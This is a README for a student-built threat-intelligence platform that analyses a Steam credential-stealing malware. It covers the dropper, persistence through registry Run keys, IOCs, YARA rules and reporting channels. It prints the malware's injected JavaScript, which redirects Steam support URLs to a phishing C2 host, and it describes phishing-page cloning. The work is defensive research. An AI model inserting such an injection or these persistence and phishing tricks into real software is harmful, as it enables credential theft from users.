# 🔬 Steam Threat Analysis Platform

> **通过分析一个真实的 Steam 凭证窃取木马，还原其完整攻击链路，并构建威胁情报可视化平台。**
>
> *Built from the ground-up analysis of a real-world Steam credential-stealing malware, featuring IOCs, attack timeline, YARA rules, and interactive visualization.*

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![Java 21](https://img.shields.io/badge/Java-21-orange)](https://openjdk.org/)
[![Spring Boot 3.2](https://img.shields.io/badge/Spring_Boot-3.2-green)](https://spring.io/)
[![Vue 3](https://img.shields.io/badge/Vue-3.4-brightgreen)](https://vuejs.org/)
[![MySQL 8](https://img.shields.io/badge/MySQL-8.0-blue)](https://www.mysql.com/)

<table>
<tr>
<td><b>⚠️ DISCLAIMER</b></td>
</tr>
<tr>
<td>

This repository is **purely for educational and defensive security research**. All executable malware samples in the analysis source folder have been permanently disabled (`.SAFE_DISABLED` suffix).
- ✅ Use this to learn, detect, and defend
- ❌ Do NOT use this to build malware
- ❌ Do NOT restore disabled files on a real machine

</td>
</tr>
</table>

---

## 📖 Table of Contents

- [Background — My Story](#-background--my-story)
- [The Malware — Attack Chain](#-the-malware--attack-chain)
- [IOC (Indicators of Compromise)](#-ioc-indicators-of-compromise)
- [Tech Stack](#-tech-stack)
- [Screenshots](#-screenshots)
- [Quick Start](#-quick-start)
- [Project Structure](#-project-structure)
- [Features](#-features)
- [Learning Path](#-learning-path)
- [How to Contribute / Help Others](#-how-to-contribute--help-others)
- [License](#-license)

---

## 🎓 Background — My Story

> I'm a freshman software engineering student in China. In June 2026, I discovered that my Steam client had been infected with a hijacking malware. Instead of just reinstalling, I decided to fully reverse-engineer the infection and understand every piece of it.

**The result:** 12 detailed analysis reports, 22 IOCs, 2,717 lines of real malware operation logs restored, and this interactive threat analysis platform.

**The victim (me):**
- SteamID64: `76561198892973993` (already reported to C2 — password changed, Steam Guard enabled)
- Infection window: 2026-06-15 23:25 ~ 2026-06-16 ~22:53 (~23.5 hours)
- Steam client: Hijacked via `steamui/chunk~2dcc5aaf7.js` injection

---

## 🦠 The Malware — Attack Chain

```
┌────────────────────────────────────────────────────────────────┐
│ Phase 0 — Social Engineering                                    │
│   "Free game / cheat / resource" → Download SteelDungeon.exe    │
└────────────────────┬───────────────────────────────────────────┘
                     ▼
┌────────────────────────────────────────────────────────────────┐
│ Phase 1 — Dropper (SteelDungeon.exe)                            │
│   • Python 3.14 + PyInstaller                                   │
│   • Self-extracts to %LocalAppData%\Programs\01anu7963sndw1ua\ │
│   • Writes 3 registry Run keys for persistence                  │
│   • Downloads b + c components from C2                          │
└────────────────────┬───────────────────────────────────────────┘
                     ▼
┌────────────────────────────────────────────────────────────────┐
│ Phase 2 — Steam UI Hijack (NexusTechNotify.exe)                 │
│   • Reads Steam VDF config → extracts SteamID64 + avatar hash   │
│   • Registers victim with C2 (nexustechsolution.top)            │
│   • Force-kills Steam process (no shutdown dialog)              │
│   • Injects ~110 bytes into chunk~2dcc5aaf7.js → ResolveURL()   │
│     ⎯ HelpAppPage → nexustechsolution.top/steamhelper           │
│     ⎯ HelpFrontPage → nexustechsolution.top/steamhelper         │
│     ⎯ SupportMessages → nexustechsolution.top/steamhelper.html  │
│   • Writes steam.cfg to disable auto-update                     │
│   • Silent restart: steam.exe -silent                           │
│   • Watchdog: checks patch integrity every 42 seconds           │
└────────────────────┬───────────────────────────────────────────┘
                     ▼
┌────────────────────────────────────────────────────────────────┐
│ Phase 3 — Phishing (locale_patch.dll + toast_window.html)       │
│   • CEF process injection loads fake Steam Customer Support     │
│     "New reply to your support ticket #HT6YWQBY4XMF55"         │
│   • 1:1 CSS restoration from Steam's chunk~2dcc5aaf7.css       │
│   • Click triggers ResolveURL("HelpAppPage") → phishing page    │
│   • Victim enters password → credentials stolen                 │
└────────────────────────────────────────────────────────────────┘
```

### JS Injection Code (the exact ~110 bytes)

```javascript
// --- Original Steam code ---
ResolveURL(e,...t){
    const r=this.m_steamUrls[e];
    if(!r)return;
    let i=r.url;

// --- Injected malware code ---
    ,_h="https://nexustechsolution.top/steamhelper?d=76561198892973993&a=45f8663926dd7e3b076963037d63a0be85244240",
    _s="https://nexustechsolution.top/steamhelper.html?u=1301664629a&d=76561198892973993&a=45f8663926dd7e3b076963037d63a0be85244240";
    return ({SupportMessages:_s,HelpAppPage:_h,HelpFrontPage:_h})[e]
        ?? (original Steam URL resolution logic continues...)

// --- Original Steam code continues ---
}
```

Key insight: `??` (nullish coalescing) makes this a **silent hijack** — only the 3 targeted keys are affected; all other Steam URLs work normally.

---

## 📊 IOC (Indicators of Compromise)

### High Severity

| Type | Value | Description |
|------|-------|-------------|
| `domain` | `nexustechsolution.top` | C2 & phishing host (Cloudflare CDN) |
| `domain` | `nexustechsolution.top/steamhelper` | Phishing page (with SteamID64 param) |
| `domain` | `nexustechsolution.top/steamhelper.html` | Backup phishing page |
| `file_path` | `%LocalAppData%\Programs\01anu7963sndw1ua\SteelDungeon.exe` | Python dropper |
| `file_path` | `%LocalAppData%\ServiceApp\NexusTechNotify.exe` | Steam hijack engine |
| `file_path` | `%LocalAppData%\ServiceApp\locale_patch.dll` | CEF injection DLL |
| `registry` | `HKCU\...\Run\SteamHelper` | Persistence (masquerades as Steam Helper) |
| `registry` | `HKCU\...\Run\SteamService` | Persistence (masquerades as Steam Service) |
| `registry` | `HKCU\...\Run\WindowsUpdateService` | Persistence (masquerades as Windows Update) |

### Medium Severity

| Type | Value | Description |
|------|-------|-------------|
| `file_path` | `steamui\chunk~2dcc5aaf7.js` | Patched Steam UI core JS (+110B injection) |
| `file_path` | `Steam\steam.cfg` | Disables automatic updates |
| `steamid` | `76561198892973993` | Victim SteamID64 (hardcoded in C2 URLs) |
| `file_path` | `C:\Windows\System32\merged_steam.py` | Malicious Python script |

### Low Severity

| Type | Value | Description |
|------|-------|-------------|
| `file_path` | `%LocalAppData%\ServiceApp\toast_window.html` | Phishing toast popup |
| `file_path` | `%LocalAppData%\ServiceApp\toast-authentic.css` | Steam Toast 1:1 CSS (169 lines) |
| `case_number` | `HT6YWQBY4XMF55` | Forged support ticket number |

Full IOC list: [database/seed_data.sql](database/seed_data.sql) (22 records)

### YARA Detection Rules

This project includes **10 custom YARA rules** based on the malware's unique characteristics:

| Rule | Target |
|------|--------|
| `SteamHijack_RegPersistence_SteamHelper` | Registry persistence (SteamHelper) |
| `SteamHijack_RegPersistence_SteamService` | Registry persistence (SteamService) |
| `SteamHijack_RegPersistence_WindowsUpdateService` | Registry persistence (WindowsUpdateService) |
| `SteamHijack_Dropper_SteelDungeon` | Python 3.14 PyInstaller dropper |
| `SteamHijack_C2_Domain` | C2 domain + phishing endpoints |
| `SteamHijack_Chunk_JS_Injection` | Patched Steam UI chunk JS |
| `SteamHijack_SteamCfg_Disabled` | Tampered steam.cfg |
| `SteamHijack_Toast_Phishing` | Phishing toast HTML/CSS |
| `SteamHijack_PyInstaller_Payload` | PyInstaller-packaged payload |
| `SteamHijack_VDF_SteamID64_Leak` | Leaked SteamID64 in logs |

Full YARA rules: [database/yara_seed.sql](database/yara_seed.sql)

---

## 🛠️ Tech Stack

| Layer | Technology |
|-------|-----------|
| **Backend** | Java 21 · Spring Boot 3.2 · Spring Data JPA · Lombok |
| **Frontend** | Vue 3.4 · Vite 5 · Element Plus · ECharts 5 · Pinia · Vue Router |
| **Database** | MySQL 8.0 |
| **Malware Analysis** | Python 3.14 · PyCryptodome · Valve VDF · Chromium CEF |
| **Visualization** | Attack chain flowchart · Force-directed component graph · Timeline · Pie/Bar charts |

---

## 📸 Screenshots

> *Running at http://localhost:5173 after `mvn spring-boot:run` + `npm run dev`*

| Dashboard | IOC Intelligence | Timeline |
|:---------:|:---------------:|:--------:|
| ![Dashboard](screenshots/dashboard.png) | ![IOC](screenshots/iocs.png) | ![Timeline](screenshots/timeline.png) |

| Component Graph | YARA Rules | Log Viewer |
|:---------------:|:----------:|:----------:|
| ![Components](screenshots/components.png) | ![YARA](screenshots/yara.png) | ![Logs](screenshots/logs.png) |

> *Tip: Open http://localhost:5173, press `Win+Shift+S` on each page, save to `screenshots/`, then commit.*

```
┌─────────────────────────────────────────────────────────────┐
│  🔬 Steam Threat Analysis Platform                           │
│                                                              │
│  ⚠️ 44 IOCs  🔴 26 HIGH  📋 2717 Events  🧩 14 Components  │
│                                                              │
│  ┌───────────────────────┐ ┌────────────────────────────┐   │
│  │ 🛰️ C2 Status (Safe)   │ │ ⚔️ Attack Chain            │   │
│  │ nexustechsolution.top │ │ Phase 0 → Phase 1 →         │   │
│  │ ■ DISCONNECTED        │ │        ↓        ↓           │   │
│  │                       │ │ Phase 2 → Phase 3           │   │
│  │ Infection: 23h        │ │                            │   │
│  │ Heartbeats: 104       │ │ [Expandable details]       │   │
│  └───────────────────────┘ └────────────────────────────┘   │
│  ┌──────────┐ ┌──────────┐ ┌───────────────────────────┐   │
│  │ IOC Risk │ │ Phase    │ │ ⏱ Recent Events           │   │
│  │ Pie Chart│ │ Bar Chart│ │ INJECT  强杀Steam 23:25:53│   │
│  │          │ │          │ │ PHISH   构建钓鱼 23:25:54  │   │
│  └──────────┘ └──────────┘ └───────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### Prerequisites

- Java 17+ & Maven 3.9+
- Node.js 18+ & npm
- MySQL 8.0+

### 1. Database

```bash
mysql -u root -p -e "CREATE DATABASE IF NOT EXISTS steam_threat_db CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;"
mysql -u root -p steam_threat_db < database/schema.sql
mysql -u root -p --default-character-set=utf8mb4 steam_threat_db < database/seed_data.sql
mysql -u root -p --default-character-set=utf8mb4 steam_threat_db < database/yara_seed.sql
```

### 2. Backend

```bash
cd backend
# Update application.yml with your MySQL password
mvn spring-boot:run
# → http://localhost:8088
```

### 3. Frontend

```bash
cd frontend
npm install
npm run dev
# → http://localhost:5173
```

### 4. Import Real Malware Logs

Open http://localhost:5173 → **Log Viewer** → Click **"Import Real Log Files"**

This imports 2,717 lines from the actual malware execution logs.

---

## 📁 Project Structure

```
steam-threat-platform/
├── backend/                             Spring Boot API
│   ├── pom.xml
│   └── src/main/java/com/steamthreat/
│       ├── SteamThreatApplication.java  Entry point
│       ├── config/CorsConfig.java       CORS for Vue dev server
│       ├── entity/                      JPA entities (Ioc, Timeline, Component, YaraRule)
│       ├── repository/                  Spring Data JPA repositories
│       ├── service/                     Business logic
│       │   ├── IocService.java          IOC CRUD + search
│       │   ├── TimelineService.java     Event queries + stats
│       │   ├── ComponentService.java    Component tree builder
│       │   ├── DataImportService.java   Real log parser & importer
│       │   ├── C2MonitorService.java    C2 status (offline-safe, no external connections)
│       │   └── YaraRuleService.java     YARA rule manager + simulated matcher
│       ├── controller/                  REST API endpoints
│       │   ├── DashboardController.java /api/dashboard
│       │   ├── IocController.java       /api/iocs (CRUD)
│       │   ├── TimelineController.java  /api/timeline
│       │   ├── ComponentController.java /api/components
│       │   ├── SystemController.java    /api/system (C2 status, log import)
│       │   └── YaraRuleController.java  /api/yara (CRUD + match)
│       └── dto/                         ApiResponse, DashboardDTO
│
├── frontend/                            Vue 3 + Element Plus
│   ├── package.json
│   ├── vite.config.js                   Dev server + API proxy
│   └── src/
│       ├── main.js                      Entry: Element Plus + Pinia + Router
│       ├── App.vue                      Layout: sidebar + dark theme + particles
│       ├── router/index.js              6 routes
│       ├── api/index.js                 Axios API layer
│       ├── views/
│       │   ├── Dashboard.vue            Stats + C2 panel + ECharts + events
│       │   ├── IocList.vue              IOC CRUD + search/filter
│       │   ├── IocDetail.vue            IOC detail view
│       │   ├── Timeline.vue             Paginated event timeline
│       │   ├── ComponentGraph.vue       Force-directed graph (ECharts)
│       │   ├── YaraRules.vue            YARA rule list + match test
│       │   └── LogViewer.vue            Real log viewer (3 tabs)
│       └── styles/global.css            Cyberpunk dark theme
│
└── database/
    ├── schema.sql                       Table definitions
    ├── seed_data.sql                    22 IOCs + 30 timeline events + 14 components
    └── yara_seed.sql                    10 custom YARA detection rules
```

---

## ✨ Features

| Feature | Description |
|---------|-------------|
| **IOC Intelligence Database** | 22 indicators with CRUD, search, and type/risk-level filtering |
| **Attack Timeline** | 2,717 real malware log entries with phase-based filtering and pagination |
| **Attack Chain Visualization** | Interactive Phase 0→3 flowchart with collapsible detail panels |
| **Component Graph** | Force-directed graph showing 14 malware components and their relationships |
| **C2 Status Monitor** | Offline-safe; reconstructs C2 connection history from local logs (no external network requests!) |
| **YARA Rule Engine** | 10 custom rules with simulated matching against text/file content |
| **Log Viewer** | Three-tab viewer for patch log (2,595 lines), C2 log (104 entries), startup log (18 entries) |
| **Dashboard ECharts** | Risk distribution pie chart, phase statistics bar chart, C2 heartbeat timeline |
| **Dark Theme** | Custom cyberpunk-inspired dark theme with particle background and micro-animations |
| **Offline-Safe** | Zero external network connections after C2 monitor redesign |

---

## 📚 Learning Path

This project covers multiple cybersecurity domains — ideal for students and beginners:

| Week | Topic | What You'll Learn |
|------|-------|-------------------|
| 1 | Malware Architecture | Understanding dropper → controller → injector → payload chains |
| 2 | Windows Persistence | Registry Run keys, random directory naming, masquerading techniques |
| 3 | Web Attack Surface | Webpack chunk injection, `??` operator silent hijack, URL routing attack |
| 4 | C2 Protocol Analysis | Heartbeat intervals, data exfiltration patterns, Cloudflare CDN hiding |
| 5 | Phishing Engineering | 1:1 CSS restoration, native font loading, real-time timestamp forgery |
| 6 | Defensive Detection | Writing YARA rules, IOC management, registry monitoring |
| 7 | Threat Visualization | ECharts integration, attack chain rendering, force-directed graphs |
| 8 | Full-Stack Development | Spring Boot REST API + Vue 3 SPA + MySQL schema design |

### Related MITRE ATT&CK Techniques

| Tactic | Technique | Present in this malware |
|--------|-----------|------------------------|
| Persistence | T1547.001 — Registry Run Keys | ✅ 3 keys |
| Defense Evasion | T1562.001 — Disable Software Update | ✅ steam.cfg tampering |
| Credential Access | T1539 — Steal Web Session | ✅ Steam session token |
| Collection | T1119 — Automated Collection | ✅ 42s watchdog loop |
| Exfiltration | T1041 — Exfiltration Over C2 Channel | ✅ HTTPS heartbeat |

---

## 🤝 How to Contribute / Help Others

### Report the C2

The C2 domain in this case uses Cloudflare CDN. You can help take it down:

- **Cloudflare Abuse**: https://www.cloudflare.com/abuse/ (Category: Phishing & Malware)
- **ICANN Domain Abuse**: https://www.icann.org/compliance/domain-abuse

### Submit Threat Intelligence

- **ThreatBook (微步在线)**: https://x.threatbook.com/
- **QiAnXin TI (奇安信)**: https://ti.qianxin.com/

### Spread Awareness

- Share the [full analysis report (Chinese)](docs/) on Zhihu / CSDN / Bilibili
- Star ⭐ this repository to increase visibility
- Help translate the docs to other languages

### Report to Valve

Email: `security@valvesoftware.com`
Subject: `Steam Client UI Hijack Malware — C2 Active`
Include:
- The chunk JS injection mechanism
- The steam.cfg tampering to disable updates
- The toast_window.html phishing popup
- C2 domain and phishing URLs

### Contribute Code

PRs welcome for:
- Real YARA engine integration (yara-python)
- Docker deployment support
- Real-time network traffic analyzer
- Automated steam.cfg integrity checker
- Browser extension for Steam phishing detection

---

## 📄 License

MIT License — see [LICENSE](LICENSE)

**Use it for education, defense, and protecting others. Do not use it to build malware.**

---

> *"A freshman student got hacked. Instead of panicking, they reverse-engineered the entire malware and built a threat analysis platform."*
>
> *If a first-year student can do this — so can you. Go build something that protects people.*

---

⭐ **Star this repo** if you found it useful for learning cybersecurity or detecting Steam malware!
